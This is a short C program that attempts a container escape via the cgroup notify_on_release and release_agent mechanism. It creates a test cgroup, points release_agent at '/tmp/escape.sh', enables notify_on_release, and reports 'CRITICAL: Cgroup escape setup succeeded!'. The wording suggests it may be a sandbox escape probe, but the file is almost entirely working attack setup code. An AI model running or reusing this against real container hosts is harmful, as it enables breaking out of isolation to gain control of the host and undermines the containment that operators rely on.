#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <errno.h>

int main() {
    printf("Attempting cgroup escape via notify_on_release...\n");
    
    const char* cgroup_path = "/sys/fs/cgroup/unified/test_escape";
    const char* release_agent = "/sys/fs/cgroup/unified/release_agent";
    const char* notify_file = "/sys/fs/cgroup/unified/test_escape/notify_on_release";
    
    // Try to create cgroup
    if (mkdir(cgroup_path, 0755) < 0 && errno != EEXIST) {
        printf("Cannot create cgroup: %s\n", strerror(errno));
        return 1;
    }
    
    // Try to set release_agent
    int fd = open(release_agent, O_WRONLY);
    if (fd < 0) {
        printf("Cannot open release_agent: %s\n", strerror(errno));
        return 1;
    }
    
    const char* payload = "/tmp/escape.sh";
    if (write(fd, payload, strlen(payload)) < 0) {
        printf("Cannot write release_agent: %s\n", strerror(errno));
        close(fd);
        return 1;
    }
    close(fd);
    
    // Try to enable notify_on_release
    fd = open(notify_file, O_WRONLY);
    if (fd < 0) {
        printf("Cannot open notify_on_release: %s\n", strerror(errno));
        return 1;
    }
    
    if (write(fd, "1", 1) < 0) {
        printf("Cannot enable notify_on_release: %s\n", strerror(errno));
        close(fd);
        return 1;
    }
    close(fd);
    
    printf("CRITICAL: Cgroup escape setup succeeded!\n");
    return 0;
}
